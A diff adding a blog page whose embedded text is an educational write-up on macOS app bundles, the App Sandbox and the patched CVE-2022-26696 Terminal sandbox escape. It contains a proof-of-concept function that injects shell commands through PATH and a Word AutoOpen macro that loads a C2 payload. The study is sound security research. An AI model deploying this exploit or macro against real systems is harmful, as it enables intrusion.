@@ -1,0 +1,1959 @@
+
+
+<!DOCTYPE html>
+<html lang="ko-KR" data-default-color-scheme="&#34;auto&#34;">
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" type="image/png" href="/img/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2025/01/19/clalxk/MacOS_TCC-Bypass_en/&#34;&gt;macOS: Part0 - TCC Bypass&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/&#34;&gt;macOS: Part1 - SIP Bypass&lt;/a&gt; &lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/MacOS_Sandbox_Escape.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;macOS: Part2 - Sandbox Escape &amp;#x2190; Now!&lt;/p&gt;
+&lt;p&gt;Hello~ I&amp;#x2019;m clalxk!&lt;/p&gt;
+&lt;p&gt;Today, following Part1, I studied Sandbox Escape.&lt;/p&gt;
+&lt;p&gt;From the concept of the macOS Sandbox to the analysis of a 1-day vulnerability (CVE-2025-31191), it&amp;#x2019;s all here&amp;#x2014;let&amp;#x2019;s learn together.. (&amp;gt;&amp;lt;)&lt;/p&gt;
+&lt;h2 id=&#34;0-App&#34;&gt;&lt;a href=&#34;#0-App&#34; class=&#34;headerlink&#34; title=&#34;0. App&#34;&gt;&lt;/a&gt;0. App&lt;/h2&gt;&lt;p&gt;If you&amp;#x2019;ve used Windows or Linux, the concept of an &lt;code&gt;App&lt;/code&gt; on macOS might feel unfamiliar. It&amp;#x2019;s unfamiliar, but not difficult b^_^b. Generally, when you run a single executable file (&lt;code&gt;.exe&lt;/code&gt;, &lt;code&gt;a.out&lt;/code&gt;), you think of the program starting immediately, loading libraries or config files from somewhere in the system as needed.&lt;/p&gt;
+&lt;p&gt;For example, on Windows, if you run &lt;code&gt;notepad++.exe&lt;/code&gt;, that one file launches the process.&lt;/p&gt;
+&lt;p&gt;During that process, required &lt;code&gt;.dll&lt;/code&gt; libraries are dynamically loaded from system folders or the installation path, and settings are stored externally in &lt;code&gt;.ini&lt;/code&gt; files or the registry.&lt;/p&gt;
+&lt;p&gt;However! On macOS, this structure is slightly different.&lt;/p&gt;
+&lt;p&gt;On macOS, an &lt;code&gt;App&lt;/code&gt; isn&amp;#x2019;t just a simple executable file but a &lt;strong&gt;bundle&lt;/strong&gt; with a &lt;strong&gt;directory structure&lt;/strong&gt; (&lt;strong&gt;Bundle&lt;/strong&gt;)&lt;/p&gt;
+&lt;p&gt;Although it looks like a single app in Finder, in Terminal you&amp;#x2019;ll see that &lt;code&gt;.app&lt;/code&gt; is a directory containing not only the executable but also all necessary &lt;strong&gt;resources, config files, plugins, code signature data, etc.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Think of macOS treating an app as a package that bundles &lt;strong&gt;everything needed to run the app&lt;/strong&gt; rather than a single program file.&lt;/p&gt;
+&lt;p&gt;Let&amp;#x2019;s look at the built-in Calculator app as an example!&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Inside the &lt;code&gt;Contents&lt;/code&gt; folder, you&amp;#x2019;ll find.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;MacOS/&lt;/code&gt;: Folder containing the executable&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Info.plist&lt;/code&gt;: XML config file holding the app&amp;#x2019;s metadata&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Resources/&lt;/code&gt;: Icons, images, language packs, other resources&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;PlugIns/&lt;/code&gt;: (Optional) Plugins&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;_CodeSignature/&lt;/code&gt;: (Optional) Code signature info&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;version.plist&lt;/code&gt;, &lt;code&gt;PkgInfo&lt;/code&gt;: (Optional) Other details&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;Info.plist&lt;/code&gt; is an XML-format file that holds important metadata about the app.&lt;/p&gt;
+&lt;p&gt;It includes the path to the executable, the app name, the bundle ID, version, and more.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs xml&#34;&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;CFBundleExecutable&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;Calculator&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;
+
+&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;CFBundleIdentifier&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;com.apple.calculator&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;string&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Let&amp;#x2019;s try running the app!&lt;/p&gt;
+&lt;h3 id=&#34;0-1-Launching-an-App&#34;&gt;&lt;a href=&#34;#0-1-Launching-an-App&#34; class=&#34;headerlink&#34; title=&#34;0.1 Launching an App&#34;&gt;&lt;/a&gt;&lt;strong&gt;0.1 Launching an App&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;Launching an app essentially means &lt;strong&gt;creating a process&lt;/strong&gt; that runs the binary specified by the &lt;code&gt;CFBundleExecutable&lt;/code&gt; key. But which parent process launches it?&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;* &lt;code&gt;CFBundleExecutable&lt;/code&gt;: A key in the &lt;code&gt;Info.plist&lt;/code&gt; of a macOS app bundle specifying the name of the binary to execute.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image2.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The command &lt;code&gt;open -a Calculator&lt;/code&gt; is the same as double-clicking the Calculator app.&lt;/p&gt;
+&lt;p&gt;I ran &lt;code&gt;ps&lt;/code&gt; while Calculator was open:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/System/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/code&gt; is running, PID 5012. Its parent process (PPID) is &lt;code&gt;1&lt;/code&gt;!&lt;/p&gt;
+&lt;p&gt;On macOS, PID 1 is &lt;code&gt;/sbin/launchd&lt;/code&gt;. This daemon manages all system and user agents on macOS&amp;#x2014;think of it like Windows&amp;#x2019; &lt;code&gt;services.exe&lt;/code&gt; or Linux&amp;#x2019;s &lt;code&gt;systemd&lt;/code&gt;. It not only manages background services but also acts as the &lt;strong&gt;parent for every GUI-launched app&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;When users double-click or use &lt;code&gt;open -a&lt;/code&gt;, the app runs as a child of &lt;code&gt;launchd&lt;/code&gt; (PID 1), making the process tree flat. On other OSes, you can trace which shell or terminal launched a program by following the PPID, but on macOS GUI launches, all apps appear as children of &lt;code&gt;launchd&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Before macOS Ventura, you could run the executable directly without &lt;code&gt;open&lt;/code&gt;. But if not launched within a proper &lt;code&gt;launchd&lt;/code&gt; environment, macOS would SIGKILL the app to protect the App Sandbox and TCC.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;$ /System/Applications/Calculator.app/Contents/MacOS/Calculator &amp;amp; 
+$ ps -A -j | grep Calculator | grep -v grep&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;When run directly, the parent was the shell, not &lt;code&gt;launchd&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;For testing, I created a dummy &lt;code&gt;.app&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;mkdir -p ~/MyApp.app/Contents/MacOS
+&lt;span class=&#34;hljs-built_in&#34;&gt;echo&lt;/span&gt; -e &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;#!/bin/bash\nsleep 10&amp;apos;&lt;/span&gt; &amp;gt; ~/MyApp.app/Contents/MacOS/MyApp
+chmod +x ~/MyApp.app/Contents/MacOS/MyApp
+
+~/MyApp.app/Contents/MacOS/MyApp &amp;amp;
+ps -A -j | grep MyApp
+
+open -a MyApp
+ps -A -j | grep MyApp&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image3.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image4.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;As expected, direct invocation makes it a terminal child while &lt;code&gt;open -a&lt;/code&gt; makes it a &lt;code&gt;launchd&lt;/code&gt; child.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;launchd&lt;/code&gt; also handles &lt;code&gt;LaunchAgents&lt;/code&gt; and &lt;code&gt;LaunchDaemons&lt;/code&gt; for background services, but we won&amp;#x2019;t cover that today. To be continued&amp;#x2026;&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;.app&lt;/code&gt; described so far is just one of many types of bundles.&lt;/p&gt;
+&lt;p&gt;macOS has various bundle types, as shown below. (This is not a complete list.)&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;.app&lt;/code&gt; &amp;#x2013; An application bundle that contains all the elements that make up an app.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;.framework&lt;/code&gt; &amp;#x2013; A framework bundle that includes not only loadable code like &lt;code&gt;.dylib&lt;/code&gt; but also resources, version information, etc. (The entire framework bundle can be loaded using &lt;code&gt;dlopen()&lt;/code&gt;.)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;.kext&lt;/code&gt; &amp;#x2013; A kernel extension bundle that acts as an extension module loaded directly into the macOS kernel. For security reasons, Apple is gradually restricting their use in the latest versions of macOS.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;.plugin&lt;/code&gt; &amp;#x2013; Plugin bundles, which include extension modules loaded by the main application&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;As such, bundles are not only used to run apps, but also serve as core components that support functional expansion and modularized structures across macOS. &lt;/p&gt;
+&lt;p&gt;If so, let&amp;#x2019;s move on~&lt;/p&gt;
+&lt;h2 id=&#34;1-App-Sandbox&#34;&gt;&lt;a href=&#34;#1-App-Sandbox&#34; class=&#34;headerlink&#34; title=&#34;1. App Sandbox&#34;&gt;&lt;/a&gt;1. App Sandbox&lt;/h2&gt;&lt;p&gt;We&amp;#x2019;ve seen that macOS apps are bundles. Now let&amp;#x2019;s see how apps are executed and restricted by the system.&lt;/p&gt;
+&lt;p&gt;The key concept today is the &lt;strong&gt;App Sandbox&lt;/strong&gt;!&lt;/p&gt;
+&lt;p&gt;Ideally, from a security standpoint, you&amp;#x2019;d never run untrusted code. But we install and run many apps, so macOS encloses each app in a &lt;strong&gt;sandbox&lt;/strong&gt;, restricting it within a &amp;#x201C;box&amp;#x201D; it can&amp;#x2019;t escape.&lt;/p&gt;
+&lt;p&gt;Sandboxed apps are denied by default.&lt;/p&gt;
+&lt;div class=&#34;table-container&#34;&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Restriction&lt;/th&gt;
+&lt;th&gt;Description&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;File system&lt;/td&gt;
+&lt;td&gt;No access to all files, including home directory&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Network&lt;/td&gt;
+&lt;td&gt;No internet or socket access&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Microphone/Camera&lt;/td&gt;
+&lt;td&gt;No direct access (requires TCC approval)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Photo library&lt;/td&gt;
+&lt;td&gt;No access (requires separate permission)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;System APIs&lt;/td&gt;
+&lt;td&gt;Blocked system calls, process control, etc.&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Child processes&lt;/td&gt;
+&lt;td&gt;Can spawn, but children inherit the same sandbox limits&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;/div&gt;
+&lt;p&gt;To avoid breaking essential features, some entitlements can be granted.&lt;/p&gt;
+&lt;p&gt;For example, an image editor needs to open/save files chosen by the user. A sandboxed app needs explicit exceptions for this, defined in its &lt;code&gt;Entitlements&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;* &lt;code&gt;Entitlements&lt;/code&gt;: Permissions declared at code signing time, listing allowed capabilities.&lt;/em&gt;&lt;/p&gt;
+&lt;h3 id=&#34;1-1-What-are-Entitlements&#34;&gt;&lt;a href=&#34;#1-1-What-are-Entitlements&#34; class=&#34;headerlink&#34; title=&#34;1.1 What are Entitlements?&#34;&gt;&lt;/a&gt;1.1 What are Entitlements?&lt;/h3&gt;&lt;p&gt;Entitlements are declared in an XML-format &lt;code&gt;.entitlements&lt;/code&gt; file or set in Xcode under Signing &amp;amp; Capabilities.&lt;/p&gt;
+&lt;div class=&#34;table-container&#34;&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Entitlement Key&lt;/th&gt;
+&lt;th&gt;Description&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;com.apple.security.network.client&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Allow network client access&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;com.apple.security.files.user-selected.read-write&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Allow read/write to user-selected files&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;com.apple.security.assets.pictures.read-write&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Allow photo library read/write&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;com.apple.security.device.camera&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Allow camera access&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;/div&gt;
+&lt;p&gt;In other words, the app cannot do anything by default, but can only operate within the permissions granted by the user.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Entitlements&lt;/code&gt; are typically written in XML format as &lt;code&gt;.entitlements&lt;/code&gt; files, and can be added visually in Xcode under the Target &amp;gt; Signing &amp;amp; Capabilities tab.&lt;/p&gt;
+&lt;p&gt;++  When using Sandbox, you must declare it as follows.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs xml&#34;&gt;
+&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;com.apple.security.app-sandbox&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;key&lt;/span&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;true&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This key must be declared for macOS to run the app in sandbox mode.&lt;/p&gt;
+&lt;h3 id=&#34;1-2-TCC&#34;&gt;&lt;a href=&#34;#1-2-TCC&#34; class=&#34;headerlink&#34; title=&#34;1.2 TCC&#34;&gt;&lt;/a&gt;1.2 TCC&lt;/h3&gt;&lt;p&gt;You&amp;#x2019;ve seen messages like:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&amp;#x201C;@@@&amp;#x201D; Would Like to Modify Apps on your Mac.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;This prompt comes from macOS&amp;#x2019;s &lt;strong&gt;TCC&lt;/strong&gt; (Transparency, Consent, and Control). When an app attempts to access sensitive data, TCC forces an explicit user consent step, preventing unauthorized access.&lt;/p&gt;
+&lt;h2 id=&#34;2-Sandbox-Escape&#34;&gt;&lt;a href=&#34;#2-Sandbox-Escape&#34; class=&#34;headerlink&#34; title=&#34;2. Sandbox Escape&#34;&gt;&lt;/a&gt;2. Sandbox Escape&lt;/h2&gt;&lt;p&gt;We&amp;#x2019;ve explored how strict the App Sandbox is. Can we bypass it to escape the sandbox?&lt;/p&gt;
+&lt;p&gt;Of course it&amp;#x2019;s not easy&amp;#x2014;macOS enforces strict access controls. But vulnerabilities have existed. Let&amp;#x2019;s analyze known macOS sandbox escape cases.&lt;/p&gt;
+&lt;h3 id=&#34;2-1-CVE-2022-26696-Sandbox-Escape-via-Terminal-app&#34;&gt;&lt;a href=&#34;#2-1-CVE-2022-26696-Sandbox-Escape-via-Terminal-app&#34; class=&#34;headerlink&#34; title=&#34;2.1 CVE-2022-26696: Sandbox Escape via Terminal.app&#34;&gt;&lt;/a&gt;2.1 CVE-2022-26696: Sandbox Escape via Terminal.app&lt;/h3&gt;&lt;p&gt;CVE-2022-26696 was a vulnerability that allowed sandboxed apps to escape the sandbox by setting &lt;strong&gt;specific environment variables&lt;/strong&gt; when running Terminal.app, causing Terminal to inherit that environment.&lt;/p&gt;
+&lt;p&gt;In Terminal&amp;#x2019;s code, &lt;code&gt;isRunningInInstallEnvironment()&lt;/code&gt; checks the &lt;code&gt;__OSINSTALL_ENVIRONMENT&lt;/code&gt; env var:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;+(char)isRunningInInstallEnvironment {
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (*(int8_t *)byte_10010617c == 0x1) {
+        rax = *(int8_t *)byte_10010617b;
+    } &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
+        COND = getenv(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;__OSINSTALL_ENVIRONMENT&amp;quot;&lt;/span&gt;) != 0x0;
+        rax = COND_BYTE_SET(NE);
+        *(int8_t *)byte_10010617b = COND ? 0x1 : 0x0;
+        *(int8_t *)byte_10010617c = 0x1;
+    }
+    rax = sign_extend_64(rax);
+    &lt;span class=&#34;hljs-built_in&#34;&gt;return&lt;/span&gt; rax;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This checks whether the environment variable &lt;code&gt;__OSINSTALL_ENVIRONMENT&lt;/code&gt; is set internally, and if it is, Terminal determines that it is &lt;strong&gt;running in the BaseSystem environment&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;* BaseSystem: Installation UI when booting from a macOS installation USB, macOS Recovery Mode, minimal system environment with BaseSystem.dmg mounted, etc.&lt;/em&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;-(void *)init {
+    var_30 = self;
+    *(&amp;amp;var_30 + 0x8) = *0x1000f4790;
+    rax = [[&amp;amp;var_30 super] init];
+    r14 = rax;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (rax != 0x0) {
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (*qword_100105e38 == 0x0) {
+            *qword_100105e38 = r14;
+        }
+        rbx = [[[NSProcessInfo processInfo] environment] mutableCopy];
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ([objc_opt_class(r14) **isRunningInInstallEnvironment**] == 0x0) {
+            [rbx removeObjectForKey:@&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;HOME&amp;quot;&lt;/span&gt;];
+            [rbx removeObjectForKey:@&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;USER&amp;quot;&lt;/span&gt;];
+            [rbx removeObjectForKey:@&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;LOGNAME&amp;quot;&lt;/span&gt;];
+            [rbx removeObjectForKey:@&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;PATH&amp;quot;&lt;/span&gt;];
+            [rbx removeObjectForKey:@&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;SHELL&amp;quot;&lt;/span&gt;];
+        }
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Within the &lt;code&gt;init&lt;/code&gt; function, if the value of isRunningInInstallEnvironment() is &lt;code&gt;NO&lt;/code&gt;, Terminal is designed to delete key environment variables such as &lt;code&gt;HOME&lt;/code&gt; and &lt;code&gt;PATH&lt;/code&gt;. However, if this value is YES, the environment variables are not deleted and remain unchanged. Ultimately, by setting the single environment variable __OSINSTALL_ENVIRONMENT=1, Terminal.app will run without deleting the environment variables. This allows sandboxed apps to execute shell commands by running Terminal.&lt;/p&gt;
+&lt;p&gt;By exploiting this vulnerability, you can achieve the desired results by performing the following actions within the sandbox app!&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Run Terminal.app with the &lt;code&gt;__OSINSTALL_ENVIRONMENT=1&lt;/code&gt; environment variable&lt;/li&gt;
+&lt;li&gt;Insert malicious commands into the &lt;code&gt;PATH&lt;/code&gt; environment variable &amp;#x2192; in the form of &lt;code&gt;$(malicious_command)&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Terminal accepts and executes the environment variables as is&lt;/li&gt;
+&lt;li&gt;Execute malicious commands by bypassing the sandboxed app&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;void sbxWithShellCommand(NSString *&lt;span class=&#34;hljs-built_in&#34;&gt;command&lt;/span&gt;) {
+    FSRef appFSURL;
+    NSString *path = @&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal&amp;quot;&lt;/span&gt;;
+    OSStatus stat2 = FSPathMakeRef((const UInt8 *)[path UTF8String], &amp;amp;appFSURL, NULL);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (stat2 &amp;lt; 0) {
+        NSLog(@&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Something wrong: %d&amp;quot;&lt;/span&gt;,stat2);
+    }
+
+    LSApplicationParameters appParam;
+    appParam.version = 0;
+    appParam.flags = kLSLaunchDefaults;
+    appParam.application = &amp;amp;appFSURL;
+    appParam.argv = NULL;
+
+    // Pass the &lt;span class=&#34;hljs-built_in&#34;&gt;command&lt;/span&gt; to be executed as an environment variable.
+    NSString *finalCommand = [NSString stringWithFormat:@&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;span class=&#34;hljs-subst&#34;&gt;$(%@)&lt;/span&gt;&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-built_in&#34;&gt;command&lt;/span&gt;];
+    NSDictionary *envs = @{@&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;PATH&amp;quot;&lt;/span&gt;:finalCommand, @&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;__OSINSTALL_ENVIRONMENT&amp;quot;&lt;/span&gt;:@&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;};
+    appParam.environment = (__bridge CFDictionaryRef)envs;
+    appParam.asyncLaunchRefCon = NULL;
+    appParam.initialEvent = NULL;
+
+    CFArrayRef array = (__bridge CFArrayRef)@[];
+    OSStatus &lt;span class=&#34;hljs-built_in&#34;&gt;stat&lt;/span&gt; = **LSOpenURLsWithRole**(array, kLSRolesAll, NULL, &amp;amp;appParam, NULL, 0);
+
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-built_in&#34;&gt;stat&lt;/span&gt; &amp;lt; 0) {
+        NSLog(@&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Something wrong: %d&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-built_in&#34;&gt;stat&lt;/span&gt;);
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Apple&amp;#x2019;s &lt;a href=&#34;https://developer.apple.com/documentation/coreservices/launch_services&#34;&gt;&lt;strong&gt;LaunchServices API&lt;/strong&gt;&lt;/a&gt; &lt;code&gt;LSOpenURLsWithRole()&lt;/code&gt; is used to run Terminal, passing the shell command as an environment variable.&lt;/p&gt;
+&lt;p&gt;Additionally, this vulnerability could also be exploited within Microsoft Word macros!&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;Sub AutoOpen()
+MacScript (&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;do shell script &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;open -b com.apple.terminal --env __OSINSTALL_ENVIRONMENT=1 --env PATH=&amp;apos;&lt;span class=&#34;hljs-subst&#34;&gt;$(/usr/bin/osascript -l JavaScript /path/.apfell.js)&lt;/span&gt;&amp;apos;&amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot; &amp;quot;&lt;/span&gt;)
+End Sub&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;You can load the Mythic &lt;strong&gt;C2 JXA Payload&lt;/strong&gt; by including it in a macro in a Word document.&lt;/p&gt;
+&lt;p&gt;++ Apple has designated this vulnerability as &lt;code&gt;CVE-2022-26696&lt;/code&gt; and modified Terminal so that it no longer trusts the &lt;code&gt;__OSINSTALL_ENVIRONMENT&lt;/code&gt; environment variable.&lt;/p&gt;
+&lt;p&gt;I checked each function based on my terminal (v2.14).&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image5.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image6.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image7.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image8.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/08/07/clalxk/MacOS_Sandbox_Escape_en/image9.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;It has been changed so that it not only filters environment variables, but also checks a wider range of security conditions and structurally initializes the internal state.&lt;/p&gt;
+&lt;p&gt;The structure that previously relied solely on &lt;code&gt;__OSINSTALL_ENVIRONMENT&lt;/code&gt; has been removed, and security has been strengthened so that Terminal only operates in a normal launchd environment. Additionally, Launch Services has been modified to recognize whether the &lt;strong&gt;XPC&lt;/strong&gt; client is in a sandboxed state.&lt;/p&gt;
+&lt;p&gt;[TTApplication init] code&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;TTApplication *__cdecl -[TTApplication init](TTApplication *self, SEL a2)
+{
+  TTApplication *v2; // rax
+  TTApplication *v3; // rbx
+  id v4; // rax
+  id v5; // rax
+  id v6; // r14
+  void *v7; // rax
+  id v8; // rax
+  id v9; // rax
+  id v10; // rax
+  id v11; // rax
+  struct objc_super v13; // [rsp+0h] [rbp-30h] BYREF
+
+  v13.receiver = self;
+  v13.cls = &amp;amp;OBJC_CLASS___TTApplication;
+  v2 = (TTApplication *)objc_msgSendSuper2(&amp;amp;v13, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;init&amp;quot;&lt;/span&gt;);
+  v3 = v2;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v2 )                                     // rax
+  {
